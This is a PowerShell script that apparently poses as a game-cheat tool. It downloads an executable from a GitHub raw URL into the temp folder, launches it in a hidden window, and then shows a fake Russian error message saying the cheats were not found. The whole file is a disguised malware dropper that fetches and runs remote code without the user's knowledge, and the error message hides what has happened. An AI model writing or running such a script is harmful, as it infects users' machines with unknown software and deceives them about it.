$url = "https://github.com/m7010957-sketch/errorww/raw/refs/heads/main/koih4tspgyzbzmj3.exe"
$path = "$env:TEMP\error.exe"
Invoke-WebRequest -Uri $url -OutFile $path
Start-Process -FilePath $path -WindowStyle Hidden
Start-Sleep -Seconds 2
Write-Host "Ошибка: читы не найдены. Попробуйте позже." -ForegroundColor Red